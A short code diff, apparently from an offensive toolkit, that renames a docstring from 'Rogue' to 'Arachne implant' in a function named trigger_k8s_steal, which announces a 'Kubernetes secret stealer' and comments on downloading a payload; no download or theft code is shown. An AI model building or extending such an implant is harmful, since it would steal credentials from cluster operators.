@@ -1,5 +1,5 @@
 def trigger_k8s_steal():
-    """Wrapper function for Rogue implant integration"""
+    """Wrapper function for Arachne implant integration"""
     print("[+] Starting Kubernetes secret stealer...")
 
     # Download the payload if not present
